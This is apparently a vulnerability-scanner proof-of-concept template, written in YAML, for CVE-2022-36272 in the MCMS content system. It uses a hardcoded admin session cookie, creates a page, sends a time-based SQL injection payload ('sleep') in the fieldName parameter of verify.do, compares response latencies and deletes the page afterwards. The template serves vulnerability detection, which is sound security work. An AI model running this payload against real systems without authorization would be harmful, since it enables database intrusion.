name: poc-yaml-mcms-cve-2022-36272-sqli
binding: d3fd0293-82ae-4f13-9fe6-032a04785805
manual: true
detail:
    author: 东晓南
    links:
        - https://github.com/ming-soft/MCMS/issues/97
        - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202208-3135
    vulnerability:
        id: CT-471160
        level: critical
    check_action: 需要登录后台
transport: http
set:
    fieldName: randomInt(1000, 2000)
    id: randomInt(1000, 2000)
    idName: randomInt(1000, 2000)
    s1: randomLowercase(randomInt(5, 20))
    s2: randomLowercase(5)
    sleepSecond: randomInt(4, 6)
    dictType: randomInt(1, 10)
    orderBy: randomInt(1, 10)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /ms/mdiy/page/save.do
            headers:
                Accept: application/json, text/plain, */*
                Content-Type: application/x-www-form-urlencoded
                Cookie: SHIRO_SESSION_ID=65673ab9-ab96-41f6-acb4-b27104aeb604; rememberMe=DYj3B/x+wTSx8L7RXGPXuC4QkLloA/5TmFdXTPByQQHxDTS5e0JmE4iIy+ZnqFmj2V0fEoRRuH4mRjnVA5oYQ72sRTLBCOJpBftzqcdUuCITwroXWYeSCi4JtCiO1jPnEya7qwmK775YrLIxhFkpGpCrrTn4y9nKg0gvFmieTO3KmHP/dEqzc8NlbC+UmZXEkjSt/PIa2Z3DWS1XfHM9CiIX4IErjMy06DZ+32J+KBZOkNzVSDRMToD7mzttYAY+erTEGT6KMosR3s+yvWQoXxn6n7eVqpa/Vqc2iEO89jCl6/liUGTd/e2696goctzP6rEOCqXOE5rDF6BigzQe60fShIv2qw2OAAJZkJMQh3zhZ4sc2burDHlyznrfXeAkag37HOt19Ebwtb4UPxeCZZm22sx+KtzHT4Fxp59c2CbfwsoJ8syEiWLN3cZsKJmsZAR9f1qNfCMcFWeB9wQQGKTUIrLJOWkKucXMrUXRQyD5QSFPPnOsT3e56JDBNZwHA4pLznhw0RGmn62OugK/fV5whD8tGf0qOavKAdljiU1u0glWSjy0CKKSWbkBImyUKLWrC1cAmsnOXn8vDHHwz4W0sKHhcBcHpXLP/06xnZano4wLFKrUnTwjOB1yzfmSQnU0TW8JAmsfvucEinBWpHYBLVan6c7Bbnl7+TfCJ0WMQvA/Jt3YB+YAwY+zFW+88yuzHiVaTOD70OQ738wJDqxid5nTQdXE1MeD0GALOMbciaLm5/LUm1N7t+5zADLUPw8gGm9uZDejoxq12ysyjr7v3WqBlU+PEpFGIXk4WyUIQ2W1Axva5CXwkSvI5+Ck9jAkhPX3mJusiFl87LHylwrZpt0XyjDaasKfbI5/9pwZcFSCj28l0DaDMdSBVrQRblBCcsKXBmfbJe4yKf+cn2wC5DrFIYIZzD87A8dT9xZfLe9Rr7oNUsLh8VEw7w0uzvNUhIaO/isv0XE3aYrRsaAmOBNEIymHsy1drHNyxOdGu4gZu2zN7CekeNdIBGHxCRTSd91uPd4ce/vj5CNOPbXKEeTwlbtELrOxzoI1YZQrX1Rf6h3cNRYOOLsMuylHl5veG+AZBmdxkWo1ElnyLWCu1xqMH0UId3BT9nMNjeuC3PnEU0SUlPGVEzj91LaQc1Mc3BbYOPTZzXM9BDVuQqTZIZLgosae66px/f0ilRFR0lWJSEI7PVXC3BUJx1ya25GgAjkgZyr5hibWeAb/B/LecuHOJHpL+wFMqJqZ5tJsNMtMQX1Z0or3SyQEfbPP/bVr+aB9vHX9PLHPonI8wcJgPYtUl6CYf0+0ag6+S49d8GoPBhYauwzAVPZPZDMDSPWKH7J3BPtIFA0=
                X-Requested-With: XMLHttpRequest
            body: createBy=&createDate=&del=0&id=0&updateDate=&pagePath={{s2}}.htm&pageTitle={{s2}}&notDel=0&pageKey={{s1}}&pageType=
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"true") && response.body.bcontains(bytes(s1))
        output:
            search: |-
                '"data" : (?P<core>(.|\\n|\\r)*),'.bsubmatch(response.body)
            core: search["core"]
    r1:
        request:
            cache: true
            method: GET
            path: /ms/mdiy/page/verify.do?fieldName={{fieldName}}&fieldValue=1&id={{id}}&idName={{idName}}
            headers:
                Cookie: SHIRO_SESSION_ID=65673ab9-ab96-41f6-acb4-b27104aeb604; rememberMe=DYj3B/x+wTSx8L7RXGPXuC4QkLloA/5TmFdXTPByQQHxDTS5e0JmE4iIy+ZnqFmj2V0fEoRRuH4mRjnVA5oYQ72sRTLBCOJpBftzqcdUuCITwroXWYeSCi4JtCiO1jPnEya7qwmK775YrLIxhFkpGpCrrTn4y9nKg0gvFmieTO3KmHP/dEqzc8NlbC+UmZXEkjSt/PIa2Z3DWS1XfHM9CiIX4IErjMy06DZ+32J+KBZOkNzVSDRMToD7mzttYAY+erTEGT6KMosR3s+yvWQoXxn6n7eVqpa/Vqc2iEO89jCl6/liUGTd/e2696goctzP6rEOCqXOE5rDF6BigzQe60fShIv2qw2OAAJZkJMQh3zhZ4sc2burDHlyznrfXeAkag37HOt19Ebwtb4UPxeCZZm22sx+KtzHT4Fxp59c2CbfwsoJ8syEiWLN3cZsKJmsZAR9f1qNfCMcFWeB9wQQGKTUIrLJOWkKucXMrUXRQyD5QSFPPnOsT3e56JDBNZwHA4pLznhw0RGmn62OugK/fV5whD8tGf0qOavKAdljiU1u0glWSjy0CKKSWbkBImyUKLWrC1cAmsnOXn8vDHHwz4W0sKHhcBcHpXLP/06xnZano4wLFKrUnTwjOB1yzfmSQnU0TW8JAmsfvucEinBWpHYBLVan6c7Bbnl7+TfCJ0WMQvA/Jt3YB+YAwY+zFW+88yuzHiVaTOD70OQ738wJDqxid5nTQdXE1MeD0GALOMbciaLm5/LUm1N7t+5zADLUPw8gGm9uZDejoxq12ysyjr7v3WqBlU+PEpFGIXk4WyUIQ2W1Axva5CXwkSvI5+Ck9jAkhPX3mJusiFl87LHylwrZpt0XyjDaasKfbI5/9pwZcFSCj28l0DaDMdSBVrQRblBCcsKXBmfbJe4yKf+cn2wC5DrFIYIZzD87A8dT9xZfLe9Rr7oNUsLh8VEw7w0uzvNUhIaO/isv0XE3aYrRsaAmOBNEIymHsy1drHNyxOdGu4gZu2zN7CekeNdIBGHxCRTSd91uPd4ce/vj5CNOPbXKEeTwlbtELrOxzoI1YZQrX1Rf6h3cNRYOOLsMuylHl5veG+AZBmdxkWo1ElnyLWCu1xqMH0UId3BT9nMNjeuC3PnEU0SUlPGVEzj91LaQc1Mc3BbYOPTZzXM9BDVuQqTZIZLgosae66px/f0ilRFR0lWJSEI7PVXC3BUJx1ya25GgAjkgZyr5hibWeAb/B/LecuHOJHpL+wFMqJqZ5tJsNMtMQX1Z0or3SyQEfbPP/bVr+aB9vHX9PLHPonI8wcJgPYtUl6CYf0+0ag6+S49d8GoPBhYauwzAVPZPZDMDSPWKH7J3BPtIFA0=
        expression: response.status >= 200
        output:
            r0latency: response.latency
    r2:
        request:
            cache: true
            method: GET
            path: /ms/mdiy/page/verify.do?fieldName={{fieldName}}%20;%20select(sleep({{sleepSecond}}))%20and%201&fieldValue=1&id={{id}}&idName={{idName}}
        expression: response.latency - r0latency >= sleepSecond * 1000 - 500
    r3:
        request:
            cache: true
            method: POST
            path: /ms/mdiy/page/delete.do
            headers:
                Content-Type: application/json
            body: |
                [{{core}}}]
            follow_redirects: false
        expression: response.status == 200 && response.body.bcontains(b"true")
expression: r0() && r1() && r2() && r3()
